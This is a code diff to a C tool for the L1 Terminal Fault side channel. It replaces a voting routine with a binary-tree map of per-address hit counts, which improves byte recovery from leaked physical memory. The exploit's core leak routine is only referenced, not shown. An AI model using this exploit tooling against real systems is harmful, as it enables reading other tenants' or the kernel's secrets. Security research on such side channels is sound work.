@@ -24,6 +24,7 @@
 #include <time.h>
 #include <ucontext.h>
 #include <unistd.h>
+#include <search.h>
 
 #pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wunused-function"
@@ -992,7 +993,7 @@ void l1tf_init(void)
   period_start = clock_read();
 }
 
-void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
+static void _l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
 {
   int i = 0;
   uintptr_t line_end = (pa & ~0x3f) + 0x40;
@@ -1004,36 +1005,64 @@ void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
   }
 }
 
-int aggregate_nibbles(char **tmp_data, int iters, int index, int mask)
+typedef uint16_t hc_t; // hit count
+typedef struct {
+  uintptr_t pa;
+  hc_t low[16];
+  hc_t high[16];
+} node_t;
+static void *hc_map = NULL; // Binary tree implementing a {pa -> hit counts} mapping.
+
+static int
+node_cmp(const void *a, const void *b)
 {
-  size_t res[16];
-  memset(res, 0, sizeof(res));
-  for (int i = 0; i < iters; i++) {
-    int nibble = tmp_data[i][index] & mask;
-    if (mask == 0xf0)
-      nibble >>= 4;
-    res[nibble]++;
+  if (((node_t *)a)->pa < ((node_t *)b)->pa)
+    return -1;
+  if (((node_t *)a)->pa > ((node_t *)b)->pa)
+    return 1;
+	return 0;
+}
+
+// Return the node at `pa`, or insert a new one with all hit counts zero.
+static node_t *hc_map_node(uintptr_t pa)
+{
+  node_t *node_new = malloc(sizeof(node_t));
+  node_new->pa = pa;
+  node_t **node = tsearch(node_new, &hc_map, node_cmp);
+  if (!node)
+    err(errno, "tsearch insufficient memory error");
+  if (*node == node_new)
+    memset(&node_new->low, 0, 2*16*sizeof(hc_t));
+  else
+    free(node_new);
+  return *node;
+}
+
+static char nibble_pick(hc_t hcs[16])
+{
+  char nibble = 0;
+  hc_t hc = 0;
+  for (int i = 1; i < 16; i++) {
+    if (hcs[i] > hc) {
+      nibble = i;
+      hc = hcs[i];
+    }
   }
-  int nibble = maximum(15, &res[1]) + 1;
-  if (res[nibble] == 0)
-    nibble = 0;
   return nibble;
 }
 
-void l1tf_leak_multi(char *data, uintptr_t base, uintptr_t pa, uintptr_t len, int iters)
+static char node_aggregate(node_t *node)
 {
-  char **tmp_data = malloc(iters * sizeof(char *));
-  for (int i = 0; i < iters; i++) {
-    tmp_data[i] = malloc(len);
-    l1tf_leak(tmp_data[i], base, pa, len);
-    display(tmp_data[i], len);
-  }
+  return (nibble_pick(node->high) << 4) | nibble_pick(node->low);
+}
 
-  for (int j = 0; j < (int)len; j++) {
-    int low = aggregate_nibbles(tmp_data, iters, j, 0x0f);
-    int high = aggregate_nibbles(tmp_data, iters, j, 0xf0);
-    data[j] = (high << 4) | low;
+void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
+{
+  _l1tf_leak(data, base, pa, len);
+  for (unsigned long i = 0; i < len; i++) {
+    node_t *node = hc_map_node(pa + i);
+    node->low[(uint8_t)(data[i] & 0x0f)]++;
+    node->high[(uint8_t)(data[i] & 0xf0) >> 4]++;
+    data[i] = node_aggregate(node);
   }
-
-  free(tmp_data);
 }
